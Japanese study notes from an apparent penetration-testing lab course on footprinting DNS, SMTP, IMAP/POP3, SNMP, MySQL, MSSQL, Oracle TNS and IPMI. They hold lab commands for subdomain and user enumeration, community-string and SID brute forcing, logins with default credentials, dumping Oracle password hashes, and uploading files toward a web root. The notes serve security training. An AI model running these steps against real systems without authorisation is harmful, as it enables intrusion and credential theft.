for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```


上のこういうのをやってくれるツール
- [DNSenum](https://github.com/fwaeytens/dnsenum)
```shell-session
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```


---
## SMTP
- `Simple Mail Transfer Protocol`（`SMTP`）は、IPネットワークで電子メールを送信するためのプロトコル
	- 本質的な機能は、許可されたユーザーのみが電子メールを送信できるようにする認証メカニズムを使用してスパムを防止すること
- ポート25を使うが、新しいSMTPサーバー(`ESMTP`)は587とかも使う
	- 認証されたユーザー/サーバーからのメールの受信用
	- SSL/TLSと組み合わせることで暗号化した通信を行う(TCP 465番とか)
	- `EHLO`コマンドの後に`STARTTLS`を送信して行う
1. MUA（Mail User Agent）がメールを **ヘッダー** と **本文** に分けてSMTPサーバーへ送信。
2. SMTPサーバーには、メールの送受信を管理する **MTA** が搭載。
    - MTAはメールの **サイズ・スパムチェックを行い、保存する**。
3. MTAの負担軽減のため、MSA（Mail Submission Agent）が **前段に配置** されることがある。
	 - MSAはメールの送信元の **正当性を確認** し、「**リレーサーバー（Relay Server）**」とも呼ばれる。
4. リレーサーバーの設定ミスにより、**オープンリレー攻撃（Open Relay Attack）** が起こることがある
5. 最後にMTAは **DNSを検索し、受信メールサーバーのIPアドレスを特定** する
6. 宛先のSMTPサーバーに到着すると、データパケットが再構成され、完全な電子メールが形成される
7. そこから、`Mail delivery agent`（`MDA`）はそれを受信者のメールボックスに転送する

| Client (`MUA`) | `➞` | Submission Agent (`MSA`) | `➞` | Open Relay (`MTA`) | `➞` | Mail Delivery Agent (`MDA`) | `➞` | Mailbox (`POP3`/`IMAP`) |
| -------------- | --- | ------------------------ | --- | ------------------ | --- | --------------------------- | --- | ----------------------- |
### プロトコル固有の欠点
- SMTPを使ってメールを送信しても、確実な配信確認が得られないこと
	- 未配信の時は、メッセージのヘッダーとともに、英語のエラーメッセージが返されるだけ
- SMTPでは接続時にユーザー認証が行われないため、メールの送信者情報を信頼できないこと
	- オープンリレーのSMTPサーバーがスパムメールの大量送信に悪用されることがよくある
	- 攻撃者は送信者アドレスを偽装（メールスプーフィング）し、追跡を回避する
		- 不審なメールを拒否したり、隔離フォルダ（スパムフォルダ）に移動する対策
		- 送信者の正当性を検証する **DomainKeys Identified Mail（DKIM）** や **Sender Policy Framework（SPF）** などの認証プロトコルもその対策例の一つ


### デフォルト設定の把握

```shell-session
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

| **Command** | **Description (日本語訳)**                          |
| ----------- | ----------------------------------------------- |
| AUTH PLAIN  | AUTH はクライアントを認証するために使用されるサービス拡張                 |
| HELO        | クライアントは自分のコンピューター名を使ってログインし、セッションを開始する          |
| MAIL FROM   | クライアントはメールの送信元を指定する                             |
| RCPT TO     | クライアントはメールの受信先を指定する                             |
| DATA        | クライアントはメールの送信を開始する                              |
| RSET        | クライアントは開始した送信を中断しますが、クライアントとサーバーの接続は維持する        |
| VRFY        | クライアントはメッセージ転送が可能なメールボックスかどうかを確認する              |
| EXPN        | クライアントはこのコマンドを使用しても、メッセージに利用可能なメールボックスかどうかを確認する |
| NOOP        | クライアントはタイムアウトによる切断を防ぐため、サーバーからの応答を要求する          |
| QUIT        | クライアントはセッションを終了する                               |

### Telnetでの接続
- `telnet`ツールを使用してSMTPサーバーとのTCP接続ができる
```shell-session
telnet 10.129.14.128 25
```
- `VRFY`コマンドを使用して、システム上の既存のユーザーを列挙できる
	- これは常に機能するわけではない
```shell-session
VRFY <Username>
```

### 危険な設定
- 受信者が信頼するリレーサーバーを使用すれば、スパムフィルターによるブロックを回避できるが、必ずリレーサーバーへの認証が必要。
- 管理者が許可 IP 範囲を把握していないと、SMTP サーバーの誤設定（オープンリレーなど）が起きやすい。
	- オープンリレーの問題点
		- スパマーや攻撃者が自由にメールを転送できるため、大量の迷惑メールやフィッシングメールの踏み台にされる可能性が高い
		- 知らぬ間に攻撃者に利用されると、サーバーのドメインや IP アドレスがブラックリストに登録されるリスクがある
- `mynetworks = 0.0.0.0/0` と設定してしまうと、世界中のどの IP アドレスからもリレーを許可してしまうため、オープンリレーになる
- 盗み見ることもできてしまう
```shell-session
mynetworks = 0.0.0.0/0
```

### 情報収集(コマンド)
- Nmap の `smtp-commands` スクリプトは、EHLO コマンドを使って対象 SMTP サーバーが受け付けるコマンドを一覧表示できる。
```shell-session
sudo nmap 10.129.14.128 -sC -sV -p25
```

- `smtp-open-relay` という Nmap のスクリプトを使って、対象の SMTP サーバーが “オープンリレー” として利用できるかどうかをテストできる
```shell-session
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

- ユーザー列挙の自動化
- Nmap,smtp-user-enum,msfconsole、それぞれで結果が異なることがあるから、　それぞれきちんと試す。
- 一つのツールで出てこなかったからと言って落ち込まずに他の手法も試せ。
```sh
sudo nmap -p 25 <IP> --script smtp-enum-users
```

- Pentestmonkey などが提供している「smtp-user-enum」というツールを使う方法もある
	- [smtp-user-enum (GitHub)](https://github.com/pentestmonkey/smtp-user-enum) や Pentestmonkey公式サイト などで配布されている。
```sh
smtp-user-enum -M VRFY \
  -U /path/to/SecLists/Usernames/names.txt \
  -t <IP>
```

- Metasploitでもできる
```sh
msfconsole
msf > search smtp_enum
msf > use auxiliary/scanner/smtp/smtp_enum

```

---

## IMAP/POP3
- IMAP (Internet Message Access Protocol)
	- メールをサーバー上で直接オンライン管理できるプロトコル
	- フォルダ構造をサポート
	- クライアント・サーバーモデルに基づき、複数クライアント間で同期が可能
	- メールをネットワークファイルシステムのように扱える
- POP3 (Post Office Protocol)
	- IMAP と比べ機能が限定的
	- サーバー上でメールの一覧表示、取得、削除のみ可能
- IMAP を使用すべきケース
	- サーバー上での階層的なメールボックス運用
	- セッション中に複数のメールボックスへアクセス
	- メールの事前振り分けや選別が必要な場合

### デフォルト設定
- IMAPの場合

| **Command**                   | **Description (日本語訳)**               |
| ----------------------------- | ------------------------------------ |
| 1 LOGIN username password     | ユーザーのログイン。                           |
| 1 LIST "" *                   | すべてのディレクトリ（メールボックス）を一覧表示。            |
| 1 CREATE "INBOX"              | 指定した名前でメールボックスを作成。                   |
| 1 DELETE "INBOX"              | メールボックスを削除。                          |
| 1 RENAME "ToRead" "Important" | メールボックス名を変更。                         |
| 1 LSUB ""                     | ユーザーがアクティブまたは購読しているディレクトリ名のサブセットを返す。 |
| 1 SELECT INBOX                | メールボックスを選択し、メッセージにアクセス可能にする。         |
| 1 UNSELECT INBOX              | 選択中のメールボックスを解除。                      |
| 1 FETCH [ID] all              | メールボックス内の特定メッセージに関連するデータを取得。         |
| 1 CLOSE                       | 「Deleted」フラグが設定されたすべてのメッセージを削除。      |
| 1 LOGOUT                      | IMAP サーバーとの接続を終了。                    |
- POP3の場合

| **Command**       | **Description (日本語訳)**               |
| ----------------- | ------------------------------------ |
| **USER username** | ユーザー名を指定し、ユーザーを識別する。                 |
| **PASS password** | パスワードを使ってユーザーを認証する。                  |
| **STAT**          | サーバーに保存されているメールの数を要求する。              |
| **LIST**          | サーバーに保存されているすべてのメールの番号とサイズを要求する。     |
| **RETR id**       | 指定した ID のメールをサーバーから取得するよう要求する。       |
| **DELE id**       | 指定した ID のメールをサーバーから削除するよう要求する。       |
| **CAPA**          | サーバーがサポートしている機能（ケイパビリティ）を表示するよう要求する。 |
| **RSET**          | サーバーが受け取った削除指示等の情報をリセットするよう要求する。     |
| **QUIT**          | POP3 サーバーとの接続を終了する。                  |
### 危険な設定
- FTPサービスと同様に、サービスで実行されたコマンドのデバッグや匿名でのログインなど、より多くの情報を得ることができる
- 多くの設定ミスを犯す可能性があり、最悪の場合、機密情報や機密情報を含む可能性のあるすべての電子メールを送受信できてしまう
危険な設定の例

| **Setting**                 | **Description (日本語訳)**                        |
| --------------------------- | --------------------------------------------- |
| **auth_debug**              | すべての認証デバッグログを有効にします。                          |
| **auth_debug_passwords**    | ログの詳細度を調整し、送信されたパスワードや認証スキームをログに出力します。        |
| **auth_verbose**            | 失敗した認証試行とその理由をログに記録します。                       |
| **auth_verbose_passwords**  | 認証に使用されたパスワードをログに記録します（短縮表示なども可能）。            |
| **auth_anonymous_username** | ANONYMOUS SASL メカニズムでログインする際に使用するユーザー名を指定します。 |

### 情報収集(コマンド)
- ドメイン名、電子メールサーバーの所属、利用可能なコマンド
```shell-session
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

- 従業員の アクセス資格情報がわかると、攻撃者はメール サーバーにログインし、個々のメッセージを読み取ったり送信したりできる
```shell-session
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
```

- `verbose`（`-v`）オプションも使用すると、接続がどのように行われるかがわかる
	- 具体的には、暗号化に使用されるTLSのバージョン、SSL証明書の詳細、さらにはメールサーバーのバージョンを含むことが多いバナーもわかる
 ```shell-session
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

- SSL を介して IMAP または POP3 サーバーと対話するには、openssl と ncat を使用できる
```shell-session
openssl s_client -connect 10.129.14.128:pop3s
```

- OpenSSL - TLS暗号化インタラクションIMAP
```shell-session
openssl s_client -connect 10.129.14.128:imaps
```

接続の開始に成功し、ターゲット メール サーバーにログインすると、上記のコマンドを使用してサーバーを操作できる


---
## SNMP
- SNMP（Simple Network Management Protocol）
- ネットワーク機器（ルーター、スイッチ、サーバーなど）の状態を監視・管理するためのプロトコル。ネットワーク管理者がデバイスの情報を取得したり、設定を変更したりするのに使う
- `public`と`private`のメーカーのデフォルトのコミュニティ文字列は、多くの場合、変更されない
- SNMP バージョン 1 と 2c  : 名前がわかっていれば、アクセスできる。
- SNMPのバージョン
	- v1 → 最も古い（認証はIPアドレスベース）
		- 通信は暗号化されていない
	- v2c → よく使われる（コミュニティストリングによる認証）
		- コミュニティストリングス
			- 要求された情報を表示するかどうかのパスワード
	- v3 → セキュリティ強化版（認証と暗号化あり）
MIB（Management Information Base）について
- 異なるベンダーやクライアント―サーバー環境でSNMPアクセスを共通化するために作られた
- 機器情報を保存する独立したフォーマット
- SNMPで問い合わせ可能なオブジェクトが、標準化されたツリー階層構造で一覧化されているテキストファイル
- 少なくとも1つ以上の「OID（オブジェクト識別子）」を含み、各オブジェクトのユニークなアドレスや名前、型、アクセス権、説明などを定義
- ASN.1に準拠したASCIIテキスト形式で記述されている
- MIB自体にはデータを格納せず、「どの情報がどこにあるか」「OIDの返す値は何か」「どのデータ型が使われるか」などを示す役割を持つ

OID（Object Identifier）について
- 階層型の名前空間におけるノードを表す
- 数字の並びでノードを一意に識別し、ツリー上の位置を特定できる
- 数字の連なりが長いほど、より詳細な情報を指す
- 多くの上位ノードは下位ノードへの参照のみを含む
- 通常、整数をドット（.）で区切った表記で表される
- 関連するOIDに対する多くのMIBは、Object Identifier Registryなどで参照できる

### デフォルト設定の把握
ここに書いてある
```shell-session
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### 危険な設定
| コマンド                                           | 説明                                     |
| :--------------------------------------------- | :------------------------------------- |
| rwuser noauth                                  | 認証なしでOIDツリー全体にアクセスを許可する                |
| rwcommunity [community string] [IPv4 address]  | リクエスト元に関係なく、OIDツリー全体へのアクセスを許可する        |
| rwcommunity6 [community string] [IPv6 address] | IPv6を使用する点を除き、rwcommunityと同等のアクセスを許可する |


### 情報収集のコマンド
- SNMPのフットプリンティングを行う際には、**snmpwalk**・**onesixtyone**・**braa**などのツールが利用できる。
- コミュニティストリングは任意の送信元に紐づけられる可能性があるため、実際に存在するコミュニティストリングを突き止めるには時間がかかることがある。

- **snmpwalk**は、OIDおよびその情報を問い合わせるためのツール。
```shell-session
snmpwalk -v2c -c public 10.129.14.128
```

- **onesixtyone**は、コミュニティストリング（管理者が任意で設定可能）の名称をブルートフォースで特定するためのツール。
```shell-session
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

- コミュニティストリングの推測のヒント:
	- SNMPコミュニティ文字列は、管理者の任意でかなり自由に名前を付けられるから、以下のような問題と特徴がありそう
		- IPアドレスごとにホストのホスト名を使ってコミュニティ文字列を付ける場合
		    - 「host1」「serverA」などの分かりやすい名称だけでなく、記号や独自の略称を含む場合もあるため、簡単には推測できない。
	- 大規模ネットワークではパターンがある可能
	    - もしSNMPで管理されているサーバーが100台以上あるような大規模環境では、コミュニティ文字列の名前付けに何らかの規則性（例：「server01」「server02」… のような連番）がある場合が多い。
	    - こうしたパターンを利用して推測することが可能。
	- カスタムワードリストを作成する方法
	    - 「crunch」などのツールを使えば、推測に使うワードリストを自分で作成できる。
	    - このようなワードリストの作成は、複数の命名パターンを総当たりする際に役立つ。

コミュニティ文字列がわかったら、[braa](https://github.com/mteg/braa) と一緒に使用して、個々の OID をブルートフォースし、その背後にある情報を列挙できる
既に判明しているコミュニティ文字列を使って、braaコマンドで特定のOID（ここでは.1.3.6.[*]以下のツリー）を総当たりし、そこにぶら下がっている情報を列挙するコマンド
```shell-session
sudo apt install braa
braa <community string>@<IP>:.1.3.6.*
braa public@10.129.14.128:.1.3.6.*
```

10.129.42.253 のホスト名を SNMP で取得する
```
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```
- snmpwalk → SNMPエージェント（デバイス）に問い合わせて、階層的なデータを取得するコマンド
- -v 2c → SNMPのバージョン2cを使用
- -c public → コミュニティストリング（パスワードみたいなもの）が "public"
- 10.129.42.253 → SNMPエージェント（対象デバイス）のIPアドレス
- 1.3.6.1.2.1.1.5.0 → OID（オブジェクト識別子）（取得したいデータを指定）
	- OID（Object Identifier）は、SNMPで取得できる情報の「アドレス」みたいなもの。
	- 1.3.6.1.2.1.1.5.0 → デバイスのホスト名（sysName）
	- 1.3.6.1.2.1.1.1.0 → デバイスの説明（sysDescr）
	- 1.3.6.1.2.1.2.2.1.2 → インターフェース一覧（ifDescr）

[onesixtyone](https://github.com/trailofbits/onesixtyone)などのツールを使用する`dict.txt`と、ツールの GitHub リポジトリに含まれているファイルなどの一般的なコミュニティ文字列の辞書ファイルを使用して、コミュニティ文字列名をブルート フォース攻撃できる
```shell-session
onesixtyone -c dict.txt 10.129.42.254
```

---
## MySQL
- CMS WordPress です。WordPressは、作成されたすべての投稿、ユーザー名、およびパスワードを独自のデータベースに保存したりしてる
- MySQLは、効率的な構文と高い応答速度が不可欠な`dynamic websites`などのアプリケーションに最適
- メジャーな組み合わせとして
	- [LAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\))（Linux、Apache、MySQL、PHP）
	- [LEMP](https://lemp.io/)(Linux、Nginx、MySQL、PHP)
	- がある。
- MySQLデータベースを備えたWebホスティングでは、これはPHPスクリプトに必要なコンテンツが保存される

### デフォルト設定
```shell-session
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

### 危険な設定
- 入力はプレーンテキストで作成されているため、`user`、`password`、および`admin_address`の設定はセキュリティに関連している。
- 多くの場合、MySQLサーバーの設定ファイルの権限が正しく割り当てられていない
- ファイルやシェルを読み取る別の方法があれば、MySQLサーバーのファイルとユーザー名とパスワードを見ることができる
- `debug`と`sql_warnings`の設定は、エラーが発生した場合に冗長な情報を出力して、攻撃のヒントをくれる

| **設定**               | **説明**                                              |
| :------------------- | :-------------------------------------------------- |
| **user**             | MySQLサービスをどのユーザー権限で動作させるかを設定します。                    |
| **password**         | MySQLユーザーのパスワードを設定します。                              |
| **admin_address**    | 管理用ネットワークインターフェースでTCP/IP接続を受け付けるIPアドレスを指定します。       |
| **debug**            | 現在のデバッグ設定を示す変数です。                                   |
| **sql_warnings**     | 単一行のINSERTステートメントで警告が発生した場合、その情報文字列を出力するかどうかを制御します。 |
| **secure_file_priv** | データのインポートおよびエクスポート操作の影響範囲を制限するために使用する変数です。          |

### 情報収集(コマンド)

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```
すべてのスキャンと同様に、一部の情報が偽陽性であることが判明する可能性があるため、結果に注意し、得られた情報を手動で確認する必要がある

MySQLとの接続
```shell-session
mysql -u root -h 10.129.14.132
```

```shell-session
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

MySQLの中でよく使うコマンド

| **コマンド**                                             | **説明**                                              |
| ---------------------------------------------------- | --------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | MySQLサーバーに接続します。「-p」フラグとパスワードの間にスペースがあって**はいけません**。 |
| `show databases;`                                    | すべてのデータベースを表示します。                                   |
| `use <database>;`                                    | 既存のデータベースの1つを選択します。                                 |
| `show tables;`                                       | 選択したデータベースで利用可能なすべてのテーブルを表示します。                     |
| `show columns from <table>;`                         | 選択したデータベースのすべての列を表示します。                             |
| `select * from <table>;`                             | 目的のテーブルにすべてを表示します。                                  |
| `select * from <table> where <column> = "<string>";` | 目的のテーブルで必要な`string`を検索します。                          |


---

## MSSQL
- Microsoft SQL (MSSQL) は、Microsoft の SQL ベースのリレーショナル データベース管理システム
- 最後のセクションで説明した MySQL とは異なり、MSSQL はクローズド ソースであり、当初は Windows オペレーティングシステムで実行するように書かれていた
- Windows を実行しているターゲットで MSSQL インスタンスに出くわす可能性が高くなる
- SQL Server Management Studio (SSMS) は、MSSQL インストール パッケージと一緒にインストールすることも、別途ダウンロードしてインストールできる機能として提供される
- SSMSはクライアント側のアプリケーションであるため、管理者または開発者がデータベースの管理を計画している任意のシステムにインストールして使用できる
- これだけじゃないけど、これらはMSSQLで使われる
	- mssql-cli, 　SQL Server PowerShell,　 HeidiSQL,　 SQLPro,　 Impacket's mssqlclient.py
```shell-session
locate mssqlclient
```

| デフォルトシステムデータベース | 説明                                                                            |
| --------------- | ----------------------------------------------------------------------------- |
| master          | SQL Server インスタンスに関するすべてのシステム情報を管理します                                         |
| model           | 新しいデータベースのテンプレートとなるデータベースです。model データベースでの設定変更は、その後に作成されるすべての新しいデータベースに反映されます |
| msdb            | SQL Server Agent がジョブやアラートをスケジュールするために使用します                                   |
| tempdb          | 一時オブジェクトを格納するためのデータベースです                                                      |
| resource        | SQL Server に含まれるシステムオブジェクトが格納されている読み取り専用のデータベースです                             |

### デフォルト設定
- 管理者が最初にMSSQLをネットワークアクセス可能にインストールして構成すると、SQLサービスは`NT SERVICE\MSSQLSERVER`として実行される
- クライアント側から接続することは、Windows認証を介して可能であり、デフォルトでは、接続を試みるときに暗号化は強制されない
- Windows Authentication による認証  
	- データベース管理システムへの接続を許可する前に、基盤となる Windows OS がログイン要求を処理する
	- その時、ローカル SAM データベースまたはドメイン コントローラー（Active Directory）を使用する
- Active Directory を利用するメリットとリスク
	- Windows 環境でのアクティビティ監査やアクセス制御に最適
	- しかし、アカウントが侵害されると、Windows ドメイン環境全体で特権の昇格や横方向の移動につながる可能性がある
- VM での設定と理解
	- どの OS、サービス、サーバー役割、アプリケーションでも同様ですが、インストールから構成までを VM 上で行うことが推奨されます。 
	- すべてのデフォルト構成や、管理者が起こし得る誤設定を把握するのに役立ちます。  


### 危険な設定
- MSSQL クライアントが MSSQL サーバーへ接続する際に暗号化を使用していない
- 暗号化を使用する場合の自己署名証明書の利用
	- 自己署名証明書は偽造される可能性がある
- 名前付きパイプの使用
	-  Windows 環境で用いられる プロセス間通信 (Inter-Process Communication: IPC) の仕組みの一つ
	- プロセス間通信を行うための「名前付き通信経路」のこと
- 弱い、またはデフォルトの sa 資格情報
	- 管理者がこのアカウントを無効化し忘れている可能性がある


### 情報収集(コマンド)

- nmapでのスキャン
```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

- Metasploitでのスキャン
```shell-session
scanner/mssql/mssql_ping
```

- Mssqlclient.pyとの接続
	- 推測したり、資格情報にアクセスしたりできる場合、MSSQLサーバーにリモートで接続し、T-SQL（Transact-SQL）を使用してデータベースとの対話を開始できる
```shell-session
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

---

## Oracle TNS
- Oracle Transparent Network Substrate (TNS) サーバーは、Oracle データベースとネットワーク上のアプリケーション間の通信を容易にする通信プロトコル
- IPX/SPXやTCP/IPプロトコルスタックなど、Oracleデータベースとクライアントアプリケーション間のさまざまなネットワークプロトコルをサポートしている

### デフォルト設定
- デフォルトポート
    - リスナーは通常 TCP/1521 ポートで待ち受け (設定変更可能)
- サポートされるプロトコル・インターフェイス
    - TCP/IP, UDP, IPX/SPX, AppleTalk をサポート
    - 複数インターフェイスや特定 IP アドレスでの待ち受けも可能
- バージョン別のリモート管理可否
    - Oracle 8i/9i: リモート管理がデフォルトで有効
    - Oracle 10g/11g: リモート管理はデフォルトで無効
- 基本的なセキュリティ機能
    - 許可されたホストのみ接続を受理
    - ホスト名・IP アドレス・ユーザー名とパスワードの組み合わせによる認証
    - Oracle Net Services によるクライアント/サーバー間通信の暗号化
- 設定ファイル
    - `tnsnames.ora` と `listener.ora`
    - 通常 `$ORACLE_HOME/network/admin` ディレクトリに配置
    - tnsnames.oraファイル
	    - クライアント側のOracle Net Servicesソフトウェアを使用してサービス名をネットワークアドレスに解決する
	- listener.oraファイル
	    - リスナーすべきサービスとリスナーの動作を決定
- Oracle TNS と連携するサービス
    - Oracle DBSNMP, Oracle データベース, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, Web サーバーなど
- デフォルトインストール時の注意点
    - Oracle 9: デフォルトパスワード「CHANGE_ON_INSTALL」
    - Oracle 10: デフォルトパスワード設定なし
    - Oracle DBSNMP: デフォルトパスワード「dbsnmp」
    - 一部組織では未だに finger サービスと併用しており、脆弱性が高まる可能性
- tnsnames.ora ファイルのエントリ構成
    - 各データベース・サービスごとに固有エントリを定義
    - 名前、ネットワーク上の所在地、サービス/データベース名などを記載
    - ORCLと呼ばれるサービスを発見できる
	    - IPアドレス10.129.11.102のポートTCP/1521でリッスンしている
	    - クライアントは、サービスに接続するときにサービス名`orcl`を使用する必要がある
	    - ただし、tnsnames.oraファイルには、さまざまなデータベースやサービス用のそのようなエントリが多数含まれている場合がある
	    - エントリには、認証の詳細、接続プール設定、ロードバランシング構成などの追加情報も含めることができる
- ブラックリストとしての機能
	- PL/SQL除外リスト（`PlsqlExclusionList`）を使用することで保護
	- `$ORACLE_HOME/sqldeveloper`ディレクトリに配置する必要があるユーザー作成のテキストファイル
    - Oracle Application Server を通じてはアクセスできない“ブラックリスト”として機能する。

| **設定**                 | **説明**                                           |
| ---------------------- | ------------------------------------------------ |
| **DESCRIPTION**        | データベースの名前と接続タイプを指定する記述子。                         |
| **ADDRESS**            | データベースのネットワークアドレス（ホスト名とポート番号を含む）。                |
| **PROTOCOL**           | サーバーとの通信に使用されるネットワークプロトコル。                       |
| **PORT**               | サーバーとの通信に使用されるポート番号。                             |
| **CONNECT_DATA**       | 接続の属性を指定（サービス名・SID・プロトコル・データベースインスタンス識別子など）。     |
| **INSTANCE_NAME**      | クライアントが接続したいデータベースインスタンスの名前。                     |
| **SERVICE_NAME**       | クライアントが接続したいサービスの名前。                             |
| **SERVER**             | データベース接続に使用されるサーバーのタイプ（例: dedicated, shared など）。 |
| **USER**               | データベースサーバーに認証するためのユーザー名。                         |
| **PASSWORD**           | データベースサーバーに認証するためのパスワード。                         |
| **SECURITY**           | 接続のセキュリティタイプ（SSL/TLS など）。                        |
| **VALIDATE_CERT**      | SSL/TLS を使用して証明書を検証するかどうか。                       |
| **SSL_VERSION**        | 接続で使用する SSL/TLS のバージョン。                          |
| **CONNECT_TIMEOUT**    | クライアントがデータベースへの接続を確立するための制限時間（秒）。                |
| **RECEIVE_TIMEOUT**    | クライアントがデータベースから応答を受け取るための制限時間（秒）。                |
| **SEND_TIMEOUT**       | クライアントがデータベースへリクエストを送信するための制限時間（秒）。              |
| **SQLNET.EXPIRE_TIME** | クライアントが接続障害を検知するための制限時間（秒）。                      |
| **TRACE_LEVEL**        | データベース接続のトレースレベル。                                |
| **TRACE_DIRECTORY**    | トレースファイルが保存されるディレクトリ。                            |
| **TRACE_FILE_NAME**    | トレースファイルの名前。                                     |
| **LOG_FILE**           | ログ情報が保存されるファイル。                                  |

### 情報収集(コマンド)
- TNSリスナーを列挙して対話する前に、Pwnboxインスタンス用にいくつかのパッケージとツールをダウンロードする必要がある
- 以下を`prepare.sh`として保存
```bash
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
cd odat/instantclient_21_12
export LD_LIBRARY_PATH="$(pwd):$LD_LIBRARY_PATH"
```
実行できたかは、以下のコマンドでわかる
- Python で書かれたオープンソースの侵入テスト ツールで、Oracle データベースの脆弱性を列挙して悪用するように設計されている
- SQLインジェクション、リモートコード実行、特権エスカレーションなど、Oracleデータベースのさまざまなセキュリティ欠陥を特定して悪用するために使用できる
```shell-session
 ./odat.py -h
```

- Nmap
```shell-session
sudo nmap -p1521 -sV <IP> --open
```

#### SIDのブルートフォース
- Oracle　RDBMSだとSIDっていうデータベースインスタンスIDが分からなければどうしようもないから何としても見つける
- Nmapの例
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
- odat.pyを使った時
```shell-session
./odat.py all -s 10.129.204.235
```

 #### ログイン
 - XEは、SIDね
	 - ユーザー名/パスワード@IP/SID
	 - **scott/tigerっていう認証情報は、デフォルトの認証情報で、CTFとかだと放置されがち。**
	 - **なので、まずは一旦この認証情報で試してみる！！！**
```shell-session
sqlplus scott/tiger@<IP>/<ブルートフォースしたSID>
```
- 次のエラーに遭遇した場合 sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory。以下を実行
```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```


#### データベース列挙
- データベースを手動で列挙するために使用できる多くの[SQLplusコマンド](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)がある。
- たとえば、現在のデータベースで利用可能なすべてのテーブルを一覧表示したり、現在のユーザーの権限を次のように表示したりできる

```shell-session
sqlplus scott/tiger@<IP>/XE
```

sysdbaでのログイン
- ログインしたユーザーが、管理権限を持っていなくても、そのユーザーアカウントを使い、sysdba（System Database Admin）としてログインを試すことができる。
	- これは、データベース管理者によって ユーザーに適切な権限を与えられている場合、または管理者自身が利用する場合に可能となる。
```shell-session
sqlplus scott/tiger@<IP>/XE as sysdba
```

#### 操作
- オラクルのデータベースにアクセスすると、さまざまなアプローチ取れる
- 私たちが持っている情報とセットアップ全体に大きく依存する
- 新規ユーザーの追加や変更はできない

`sys.user$`からパスワードハッシュを取得し、オフラインで解読しようと試みるコマンド
```shell-session
select name, password from sys.user$;
```

別のオプションは、ターゲットにWebシェルをアップロードすること
- これにはサーバーがWebサーバーを実行する必要があり、Webサーバーのルートディレクトリの正確な場所を知る必要がある
	- Linux : `/var/www/html`
	- Windows : `C:\inetpub\wwwroot`
- ウイルス対策や侵入検知/防止システムにとって危険に見えないファイルで悪用アプローチを試すことは常に重要
	- 文字列でテキストファイルを作成し、それを使用してターゲットシステムにアップロードできる
```shell-session
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

ファイルアップロードが正しくできているかを判断する
```shell-session
curl -X GET http://10.129.204.235/testing.txt
```


---

## IPMI
- [インテリジェントプラットフォーム管理インターフェイス](https://www.thomas-krenn.com/en/wiki/IPMI_Basics)（`IPMI`）は、システム管理と監視に使用されるハードウェアベースのホスト管理システムの標準化された仕様のセット
	- なんかIPMI専用のチップがあるサーバーでできるらしい
	- だから完全にサーバーを管理するサーバーって感じだね
	- 自律的なサブシステムとして機能し、ホストのBIOS、CPU、ファームウェア、および基盤となるオペレーティングシステムとは独立して動作する
	- IPMI プロトコルは 1998 年に Intel によって最初にリリースされ、現在、Cisco、Dell、HP、Supermicro、Intel など、200 以上のシステム ベンダーによってサポートされている
	- IPMIバージョン2.0を使用するシステムは、シリアルオーバーLANを介して管理できるため、システム管理者はシリアルコンソール出力をバンドで表示できる
	- IPMIが機能するためには、次のコンポーネントが必要
		- ベースボード管理コントローラ（BMC）-マイクロコントローラとIPMIの必須コンポーネント
		- インテリジェントシャーシ管理バス（ICMB）-あるシャーシから別のシャーシへの通信を可能にするインターフェース
		- インテリジェントプラットフォーム管理バス（IPMB）-BMCを拡張する
		- IPMIメモリ - システムイベントログ、リポジトリストアデータなどを保存します。
